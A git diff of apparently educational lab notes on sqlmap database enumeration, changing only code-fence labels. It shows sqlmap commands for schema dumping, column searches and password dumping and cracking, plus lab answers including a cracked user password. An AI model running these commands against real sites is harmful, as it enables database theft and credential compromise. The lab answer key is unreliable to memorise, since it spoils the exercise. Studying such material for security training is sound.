@@ -2,7 +2,7 @@
 ## DB Schema Enumeration
 If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:
 
-```sh
+```shellsession
 $ sqlmap -u "http://www.example.com/?id=1" --schema
 
 ...SNIP...
@@ -54,7 +54,7 @@ Table: users
 ## Searching for Data
 When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`:
 
-```sh
+```shellsession
 $ sqlmap -u "http://www.example.com/?id=1" --search -T user
 
 ...SNIP...
@@ -89,7 +89,7 @@ do you want to dump found table(s) entries? [Y/n]
 
 We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):
 
-```sh
+```shellsession
 $ sqlmap -u "http://www.example.com/?id=1" --search -C pass
 
 ...SNIP...
@@ -133,14 +133,14 @@ Table: servers
 
 ## DB Users Password Enumeration and Cracking
 
-```sh
+```shellsession
 $ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
 ```
 
 ## Questions 
 1. What's the name of the column containing "style" in it's name? (Case #1) **Answer: PARAMETER_STYLE**
    - Search for column containing "style":
-        ```sh
+        ```shellsession
         $ sqlmap -u 'http://154.57.164.69:32239/case1.php?id=1*' --batch --level 5 --risk 3 --threads 10 --search -C style
         <SNIP>
         columns LIKE 'style' were found in the following databases:
@@ -156,7 +156,7 @@ $ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
         ```
 2. What's the Kimberly user's password? (Case #1) **Answer: Enizoom1609**
    - Dump the users table with where condition and crack the password automatically:
-        ```sh
+        ```shellsession
         $ sqlmap -u 'http://154.57.164.69:32239/case1.php?id=1*' --batch --level 5 --risk 3 --threads 10 -T users --where="name LIKE '%kimberly%'" --dump
         Database: testdb                                                                                                                                                                                                                                       
         Table: users
